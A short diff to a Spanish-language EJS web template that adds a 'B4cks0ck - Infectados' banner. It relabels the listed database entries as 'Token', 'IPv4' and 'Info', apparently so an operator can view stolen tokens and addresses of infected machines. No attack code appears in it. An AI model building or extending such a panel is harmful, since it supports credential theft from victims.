@@ -23,16 +23,21 @@
         </header>
         <section class="SectionMain">
             <div class="main">
+                <img src="/cube.png" alt="B4cks0ck" class="invert">
+                <h1>B4cks0ck - Infectados</h1>
+                <p>"Ahora la presa se convierte en cazador."</p>
                 <div class="items">
+                    <hr>
+                    <br>
                     <% if(db == null || db == "") { %>
                       <p>No hay nada en la base de datos</p>
                     <% } else { %>
                         <% for(item of db) { %>
                             <div class="item">
                                 <p>ID: <%= item.id %></p>
-                                <p>Contenido1: <%= item.OneContent %></p>
-                                <p>Contenido2: <%= item.TwoContent %></p>
-                                <p>Contenido3: <%= item.ThreeContent %></p>
+                                <p>Token: <%= item.OneContent %></p>
+                                <p>IPv4: <%= item.TwoContent %></p>
+                                <p>Info: <%= item.ThreeContent %></p>
                                 <hr>
                             </div>
                         <% } %>
